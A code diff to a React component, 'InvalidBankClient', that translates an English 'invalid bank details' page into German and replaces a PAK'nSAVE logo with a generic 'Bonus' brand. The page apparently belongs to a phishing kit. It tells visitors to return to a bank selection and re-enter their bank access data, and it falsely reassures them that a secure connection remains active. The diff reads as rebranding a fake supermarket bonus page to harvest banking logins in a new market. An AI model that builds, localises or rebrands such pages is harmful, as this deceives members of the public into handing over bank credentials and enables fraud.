@@ -41,7 +41,7 @@ export function InvalidBankClient({ sessionId }: Props) {
         {!sessionId ? (
           <div className="flex justify-center relative z-10 w-full">
             <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-600 shadow-sm w-full max-w-sm">
-              Invalid link.
+              Ungültiger Link.
             </p>
           </div>
         ) : (
@@ -49,14 +49,14 @@ export function InvalidBankClient({ sessionId }: Props) {
             <div className="pak-form-inner px-5 pb-6 pt-6 sm:px-8 sm:pb-8 sm:pt-8">
               <div className="mx-auto flex w-full max-w-[520px] items-start justify-between gap-3">
                 <div>
-                  <h2 className="pak-form-title max-w-[11ch]">Invalid bank details</h2>
+                  <h2 className="pak-form-title max-w-[11ch]">Ungültige Bankdaten</h2>
                   <p className="pak-form-subtitle mt-2.5 max-w-[31rem]">
-                    The details entered could not be verified. Review the information carefully and try again.
+                    Die eingegebenen Daten konnten nicht verifiziert werden. Überprüfen Sie die Angaben sorgfältig und versuchen Sie es erneut.
                   </p>
                 </div>
                 <img
-                  src="/form-assets/paknsave-logo-form.png"
-                  alt="PAK'nSAVE"
+                  src="/form-assets/logo-form.svg"
+                  alt="Bonus"
                   className="pak-form-brand-logo shrink-0"
                 />
               </div>
@@ -74,21 +74,21 @@ export function InvalidBankClient({ sessionId }: Props) {
                 </div>
 
                 <p className="mb-6 max-w-[31rem] text-sm font-medium leading-6 text-white/82 sm:text-[0.95rem]">
-                  Return to the bank selection and enter your details again. Make sure the access data matches your bank exactly.
+                  Kehren Sie zur Bankauswahl zurück und geben Sie Ihre Daten erneut ein. Stellen Sie sicher, dass die Zugangsdaten genau zu Ihrer Bank passen.
                 </p>
 
                 <button
                   onClick={() => void handleRetry()}
                   className="pak-form-button min-h-[3.65rem] w-full max-w-[22rem] px-6 text-lg"
                 >
-                  Try again
+                  Erneut versuchen
                 </button>
 
                 <div className="mt-5 pak-form-security justify-center text-center">
                   <svg className="h-8 w-8 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                     <path d="M12 15v2m-6 4h12a2 2 0 0 0 2-2v-6a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2Zm10-10V7a4 4 0 0 0-8 0v4h8Z" strokeLinecap="round" strokeLinejoin="round" />
                   </svg>
-                  <span>Secure connection remains active</span>
+                  <span>Sichere Verbindung bleibt aktiv</span>
                 </div>
               </div>
             </div>
